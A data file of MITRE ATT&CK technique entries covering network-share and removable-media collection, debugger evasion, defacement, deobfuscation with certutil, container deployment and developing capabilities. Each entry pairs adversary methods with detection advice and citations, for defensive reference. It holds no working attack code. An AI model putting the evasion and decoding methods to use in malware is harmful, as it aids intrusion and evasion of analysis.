{"ID":"T1039","name":"Data from Network Shared Drive","description":"Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.","url":"https://attack.mitre.org/techniques/T1039","created":"31 May 2017","last modified":"30 March 2023","version":"1.3","tactics":"Collection","detection":"Monitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Network Share: Network Share Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"David Tayouri","permissions required":null,"supports remote":null,"system requirements":"Privileges to access network shared drive","impact type":null,"effective permissions":null,"relationship citations":"(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: CISA AA20-259A Iran-Based Actor September 2020),(Citation: NCC Group Chimera January 2021),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Forcepoint Monsoon),(Citation: NHS Digital Egregor Nov 2020),(Citation: F-Secure Cosmicduke),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: ESET Gamaredon June 2020),(Citation: Symantec Sowbug Nov 2017),(Citation: PWC Cloud Hopper April 2017),(Citation: Eset Ramsay May 2020),"}
{"ID":"T1025","name":"Data from Removable Media","description":"Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information. \n\nSome adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on removable media.","url":"https://attack.mitre.org/techniques/T1025","created":"31 May 2017","last modified":"15 October 2021","version":"1.2","tactics":"Collection","detection":"Monitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, File: File Access","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"William Cain","permissions required":null,"supports remote":null,"system requirements":"Privileges to access removable media drive and files","impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Turla PowerShell May 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Palo Alto Gamaredon Feb 2017),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Talos GravityRAT),(Citation: ESET InvisiMole June 2020),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Symantec Waterbug Jun 2019),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: ESET Sednit USBStealer 2014),(Citation: ESET Machete July 2019),(Citation: FireEye APT30),(Citation: ESET Operation Groundbait),(Citation: Palo Alto Rover),(Citation: Microsoft SIR Vol 19),(Citation: Kaspersky TajMahal April 2019),(Citation: Eset Ramsay May 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: ESET Crutch December 2020),(Citation: KISA Operation Muzabi),(Citation: F-Secure Cosmicduke),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: Cylance Machete Mar 2017),(Citation: ESET Gamaredon June 2020),(Citation: Talos Oblique RAT March 2021),(Citation: CheckPoint Naikon May 2020),(Citation: Kaspersky Sofacy),"}
{"ID":"T1622","name":"Debugger Evasion","description":"Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github)\n\nDebugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.\n\nSpecific checks will vary based on the target and/or adversary, but may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow” or handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)\n\nAdversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>OutputDebugStringW()</code>.(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021)","url":"https://attack.mitre.org/techniques/T1622","created":"01 April 2022","last modified":"16 April 2022","version":"1.0","tactics":"Defense Evasion, Discovery","detection":"Debugger related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to debugger identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious [Native API](https://attack.mitre.org/techniques/T1106) function calls as well as processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.\n\nMonitor debugger logs for signs of abnormal and potentially malicious activity.","platforms":"Linux, Windows, macOS","data sources":"Application Log: Application Log Content, Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"TruKno","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCCGroup RokRat Nov 2018),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Talos Group123),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Check Point Black Basta October 2022),(Citation: wardle evilquest partii),(Citation: ClearSky Lazarus Aug 2020),(Citation: Malwarebytes Saint Bot April 2021),"}
{"ID":"T1491","name":"Defacement","description":"Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for [Defacement](https://attack.mitre.org/techniques/T1491) include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of [Defacement](https://attack.mitre.org/techniques/T1491) in order to cause user discomfort, or to pressure compliance with accompanying messages. \n","url":"https://attack.mitre.org/techniques/T1491","created":"08 April 2019","last modified":"25 March 2022","version":"1.3","tactics":"Impact","detection":"Monitor internal and external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.\n\n","platforms":"IaaS, Linux, Windows, macOS","data sources":"Application Log: Application Log Content, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Integrity","effective permissions":null,"relationship citations":",(Citation: Ready.gov IT DRP)"}
{"ID":"T1491.002","name":"Defacement: External Defacement","description":"An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002) may ultimately cause users to distrust the systems and to question/discredit the system’s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement)","url":"https://attack.mitre.org/techniques/T1491/002","created":"20 February 2020","last modified":"25 March 2022","version":"1.2","tactics":"Impact","detection":"Monitor external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.","platforms":"IaaS, Linux, Windows, macOS","data sources":"Application Log: Application Log Content, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1491","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Integrity","effective permissions":null,"relationship citations":"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: UK NCSC Olympic Attacks October 2020),(Citation: Ready.gov IT DRP)"}
{"ID":"T1491.001","name":"Defacement: Internal Defacement","description":"An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)","url":"https://attack.mitre.org/techniques/T1491/001","created":"20 February 2020","last modified":"28 July 2022","version":"1.1","tactics":"Impact","detection":"Monitor internal and websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.","platforms":"Linux, Windows, macOS","data sources":"Application Log: Application Log Content, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1491","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Integrity","effective permissions":null,"relationship citations":"(Citation: Minerva Labs Black Basta May 2022),(Citation: Deep Instinct Black Basta August 2022),(Citation: Palo Alto Networks Black Basta August 2022),(Citation: Fortinet Diavol July 2021),(Citation: Check Point Meteor Aug 2021),(Citation: Sophos BlackCat Jul 2022),(Citation: Avertium Black Basta June 2022),(Citation: Cyble Black Basta May 2022),(Citation: Novetta Blockbuster Destructive Malware),(Citation: CERT-EE Gamaredon January 2021),(Citation: Check Point Black Basta October 2022),(Citation: BlackBerry Black Basta May 2022),(Citation: Trend Micro Black Basta May 2022),(Citation: Microsoft BlackCat Jun 2022),(Citation: NCC Group Black Basta June 2022),(Citation: Ready.gov IT DRP)"}
{"ID":"T1140","name":"Deobfuscate/Decode Files or Information","description":"Adversaries may use [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of [certutil](https://attack.mitre.org/software/S0160) to decode a remote access tool portable executable file that has been hidden inside a certificate file.(Citation: Malwarebytes Targeted Attack against Saudi Arabia) Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.(Citation: Carbon Black Obfuscation Sept 2016)\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016)","url":"https://attack.mitre.org/techniques/T1140","created":"14 December 2017","last modified":"21 April 2023","version":"1.2","tactics":"Defense Evasion","detection":"Detecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as [certutil](https://attack.mitre.org/software/S0160).\n\nMonitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.","platforms":"Linux, Windows, macOS","data sources":"File: File Modification, Process: Process Creation, Script: Script Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Anti-virus, Host Intrusion Prevention Systems, Network Intrusion Detection System, Signature-based Detection","contributors":"Matthew Demaske, Adaptforward; Red Canary","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Talos Zeus Panda Nov 2017),(Citation: Secureworks REvil September 2019),(Citation: NHS Digital Egregor Nov 2020),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Proofpoint Azorult July 2018),(Citation: Talent-Jump Clambling February 2020),(Citation: TrendMicro Lazarus Nov 2018),(Citation: Trend Micro DRBControl February 2020),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: ProofPoint Ursnif Aug 2016),(Citation: McAfee Lazarus Nov 2020),(Citation: ESET InvisiMole June 2018),(Citation: Flashpoint FIN 7 March 2019),(Citation: SecureWorks August 2019),(Citation: Korean FSI TA505 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Trustwave Pillowmint June 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: ESET Okrum July 2019),(Citation: ESET Zebrocy Nov 2018),(Citation: Unit 42 KerrDown February 2019),(Citation: NCSC Cyclops Blink February 2022),(Citation: objsee mac malware 2017),(Citation: CoinTicker 2019),(Citation: Unit 42 Lucifer June 2020),(Citation: sentinelone shlayer to zshlayer),(Citation: Unit 42 Bisonal July 2018),(Citation: Morphisec ShellTea June 2019),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: ANSSI Sandworm January 2021),(Citation: Checkpoint IndigoZebra July 2021),(Citation: ESET Telebots July 2017),(Citation: Sophos Netwalker May 2020),(Citation: Unit 42 QUADAGENT July 2018),(Citation: PWC WellMess C2 August 2020),(Citation: Unit42 Cannon Nov 2018),(Citation: FireEye APT34 Dec 2017),(Citation: Unit 42 PingPull Jun 2022),(Citation: Microsoft Actinium February 2022),(Citation: US-CERT Bankshot Dec 2017),(Citation: Prevailion DarkWatchman 2021),(Citation: objective-see windtail1 dec 2018),(Citation: ESET Casbaneiro Oct 2019),(Citation: Palo Alto Brute Ratel July 2022),(Citation: ESET Gamaredon June 2020),(Citation: Proofpoint Bumblebee April 2022),(Citation: Cybereason Conti Jan 2021),(Citation: Talos Bisonal Mar 2020),(Citation: Symantec Dyre June 2015),(Citation: Group IB GrimAgent July 2021),(Citation: Trend Micro Iron Tiger April 2021),(Citation: APT15 Intezer June 2018),(Citation: JPCert TSCookie March 2018),(Citation: Securelist Darkhotel Aug 2015),(Citation: NCC Group Team9 June 2020),(Citation: Palo Alto Networks BBSRAT),(Citation: Cybereason PowerLess February 2022),(Citation: ZScaler Squirrelwaffle Sep 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: Symantec Orangeworm April 2018),(Citation: Cisco Talos Intelligence Group),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Securelist APT10 March 2021),(Citation: ESET PipeMon May 2020),(Citation: Proofpoint TA505 October 2019),(Citation: Symantec Sowbug Nov 2017),(Citation: Cybereason Valak May 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: Threatpost Hancitor),(Citation: McAfee Honeybee),(Citation: MSTIC NOBELIUM Mar 2021),(Citation: TrendMicro Gamaredon April 2020),(Citation: Check Point APT34 April 2021),(Citation: Medium Babuk February 2021),(Citation: Unit 42 Shamoon3 2018),(Citation: Fidelis TrickBot Oct 2016),(Citation: Rancor Unit42 June 2018),(Citation: BleepingComputer Molerats Dec 2020),(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: Cybereason Egregor Nov 2020),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: CISA AA20-301A Kimsuky),(Citation: Unit42 BendyBear Feb 2021),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: Malwarebytes Dyreza November 2015),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: ESET Machete July 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: CISA SoreFang July 2016),(Citation: CIRCL PlugX March 2013),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Bitdefender Naikon April 2021),(Citation: Unit 42 Sofacy Feb 2018),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: Trend Micro Tick November 2019),(Citation: Talos MuddyWater Jan 2022),(Citation: Malwarebytes AvosLocker Jul 2021),(Citation: CarbonBlack Conti July 2020),(Citation: PWC WellMess July 2020),(Citation: Unit42 Molerat Mar 2020),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Arxiv Avaddon Feb 2021),(Citation: Lazarus APT January 2022),(Citation: Securelist Remexi Jan 2019),(Citation: FireEye MESSAGETAP October 2019),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Eset Ramsay May 2020),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ESET Gelsemium June 2021),(Citation: Malwarebytes Agent Tesla April 2020),(Citation: Cisco Ukraine Wipers January 2022),(Citation: FBI FLASH APT39 September 2020),(Citation: Microsoft FinFisher March 2018),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Unit 42 NOKKI Sept 2018),(Citation: Qualys LolZarus),(Citation: TrendMicro TropicTrooper 2015),(Citation: Unit42 DarkHydrus Jan 2019),(Citation: ESET Dukes October 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Unit 42 RGDoor Jan 2018),(Citation: FireEye MuddyWater Mar 2018),(Citation: NSA/FBI Drovorub August 2020),(Citation: ESET Carbon Mar 2017),(Citation: Unit 42 Nokki Oct 2018),(Citation: Unit 42 Valak July 2020),(Citation: Talos PoetRAT October 2020),(Citation: Cybereason Molerats Dec 2020),(Citation: CheckPoint Naikon May 2020),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: G Data Sodinokibi June 2019),(Citation: Intel 471 REvil March 2020),(Citation: TrendMicro EarthLusca 2022),(Citation: Malwarebytes Konni Aug 2021),(Citation: Kaspersky Sodin July 2019),(Citation: McAfee Sharpshooter December 2018),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: IBM TA505 April 2020),(Citation: Proofpoint TA416 Europe March 2022),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Cybereason Chaes Nov 2020),(Citation: ESET Telebots Dec 2016),(Citation: Talos Rocke August 2018),(Citation: Accenture Hogfish April 2018),(Citation: ATT QakBot April 2021),(Citation: Mcafee Clop Aug 2019),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Unit42 CookieMiner Jan 2019),(Citation: Cyberreason Anchor December 2019),(Citation: ESET Industroyer),(Citation: ESET Operation Spalax Jan 2021),(Citation: NCC Group TA505),(Citation: Trend Micro Waterbear December 2019),(Citation: Check Point Warzone Feb 2020),(Citation: FireEye Hancitor),(Citation: ClearSky MuddyWater Nov 2018),(Citation: ESET ForSSHe December 2018),(Citation: CheckPoint Bandook Nov 2020),(Citation: Microsoft Unidentified Dec 2018),(Citation: Joe Sec Trickbot),(Citation: FinFisher Citation),(Citation: Cylance Sodinokibi July 2019),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Accenture MUDCARP March 2019),(Citation: Unit 42 Siloscape Jun 2021),(Citation: IBM MegaCortex),(Citation: CISA ComRAT Oct 2020),(Citation: Medium S2W WhisperGate January 2022),(Citation: CrowdStrike IceApple May 2022),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: Unit 42 VERMIN Jan 2018),(Citation: Cylance Dust Storm),(Citation: Securelist Dtrack),(Citation: FireEye SUNSHUTTLE Mar 2021),(Citation: ESET Kobalos Jan 2021),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: Unit42 RDAT July 2020),(Citation: SentinelLabs Metador Sept 2022),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Netskope Squirrelwaffle Oct 2021),(Citation: Lab52 WIRTE Apr 2019),(Citation: OilRig New Delivery Oct 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Turla PowerShell May 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Securelist LuckyMouse June 2018),(Citation: Novetta Winnti April 2015),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Malwarebytes Targeted Attack against Saudi Arabia),(Citation: Malwarebytes Higaisa 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: McAfee Sodinokibi October 2019),(Citation: Medium Metamorfo Apr 2020),(Citation: Cybereason Astaroth Feb 2019),(Citation: US-CERT TYPEFRAME June 2018),(Citation: Microsoft NICKEL December 2021),(Citation: Palo Alto Sofacy 06-2018),(Citation: ESET LightNeuron May 2019),(Citation: CISA WellMail July 2020),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: NCC Group WastedLocker June 2020),(Citation: ESET InvisiMole June 2020),(Citation: Trend Micro Skidmap),(Citation: MuddyWater TrendMicro June 2018),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: FireEye Metamorfo Apr 2018),(Citation: Kaspersky QakBot September 2021),(Citation: CISA WellMess July 2020),(Citation: FireEye FIN7 Oct 2019),(Citation: Cybereason Bazar July 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Kaspersky MoleRATs April 2019),(Citation: BlackBerry CostaRicto November 2020),(Citation: Medium KONNI Jan 2020),(Citation: BiZone Lizar May 2021),(Citation: Microsoft DUBNIUM July 2016),(Citation: Symantec RAINDROP January 2021),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Gh0stRAT ATT March 2019),(Citation: Mandiant APT41),(Citation: Talos Lokibot Jan 2021),(Citation: Talos Smoke Loader July 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: Talos Frankenstein June 2019),(Citation: Zscaler Higaisa 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Intezer HiddenWasp Map 2019),(Citation: ESET ComRAT May 2020),(Citation: Unit 42 OopsIE! Feb 2018),(Citation: FireEye APT29 Nov 2018),(Citation: Unit 42 Hildegard Malware),(Citation: Carbon Black Shlayer Feb 2019),(Citation: MSTIC FoggyWeb September 2021),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Microsoft Expand Utility),(Citation: Accenture HyperStack October 2020),(Citation: ESET DazzleSpy Jan 2022),(Citation: Check Point APT31 February 2021),(Citation: FireEye APT10 Sept 2018),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Check Point Sunburst Teardrop December 2020),(Citation: Chronicle Winnti for Linux May 2019),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Cyberint Qakbot May 2021),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: 20 macOS Common Tools and Techniques),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: FireEye FiveHands April 2021),(Citation: NCC Group Fivehands June 2021),(Citation: ESET Ebury Oct 2017),"}
{"ID":"T1610","name":"Deploy Container","description":"Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment.\n\nContainers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow.(Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)","url":"https://attack.mitre.org/techniques/T1610","created":"29 March 2021","last modified":"15 April 2023","version":"1.2","tactics":"Defense Evasion, Execution","detection":"Monitor for suspicious or unknown container images and pods in your environment. Deploy logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application pods to detect malicious activity at the cluster level. In Docker, the daemon log provides insight into remote API calls, including those that deploy containers. Logs for management services or applications used to deploy containers other than the native technologies themselves should also be monitored.","platforms":"Containers","data sources":"Application Log: Application Log Content, Container: Container Creation, Container: Container Start, Pod: Pod Creation, Pod: Pod Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Alfredo Oliveira, Trend Micro; Ariel Shuper, Cisco; Center for Threat-Informed Defense (CTID); Idan Frimark, Cisco; Magno Logan, @magnologan, Trend Micro; Pawan Kinger, @kingerpawan, Trend Micro; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team","permissions required":null,"supports remote":true,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Aqua Kinsing April 2020),(Citation: Cisco Talos Intelligence Group),(Citation: Peirates GitHub),(Citation: Intezer Doki July 20),(Citation: Intezer TeamTNT September 2020),(Citation: Trend Micro TeamTNT),(Citation: Kubernetes Hardening Guide),(Citation: Kubernetes API Control Access),(Citation: Kubernetes RBAC),(Citation: Microsoft AKS Azure AD 2023),(Citation: Docker Daemon Socket Protect),(Citation: Kubernetes Cloud Native Security)"}
{"ID":"T1587","name":"Develop Capabilities","description":"Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)\n\nAs with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.","url":"https://attack.mitre.org/techniques/T1587","created":"01 October 2020","last modified":"17 October 2021","version":"1.1","tactics":"Resource Development","detection":"Consider analyzing malware for features that may be associated with the adversary and/or their developers, such as compiler used, debugging artifacts, or code similarities. Malware repositories can also be used to identify additional samples associated with the adversary and identify development patterns over time.\n\nConsider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Defense Evasion or Command and Control.","platforms":"PRE","data sources":"Internet Scan: Response Content, Malware Repository: Malware Content, Malware Repository: Malware Metadata","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: VirusBulletin Kimsuky October 2019),"}
{"ID":"T1587.002","name":"Develop Capabilities: Code Signing Certificates","description":"Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may develop self-signed code signing certificates for use in operations.","url":"https://attack.mitre.org/techniques/T1587/002","created":"01 October 2020","last modified":"17 October 2021","version":"1.1","tactics":"Resource Development","detection":"Consider analyzing self-signed code signing certificates for features that may be associated with the adversary and/or their developers, such as the thumbprint, algorithm used, validity period, and common name. Malware repositories can also be used to identify additional samples associated with the adversary and identify patterns an adversary has used in crafting self-signed code signing certificates.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related follow-on behavior, such as [Code Signing](https://attack.mitre.org/techniques/T1553/002) or [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004).","platforms":"PRE","data sources":"Malware Repository: Malware Metadata","is sub-technique":true,"sub-technique of":"T1587","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Lazarus Jun 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: Unit 42 BackConfig May 2020),"}
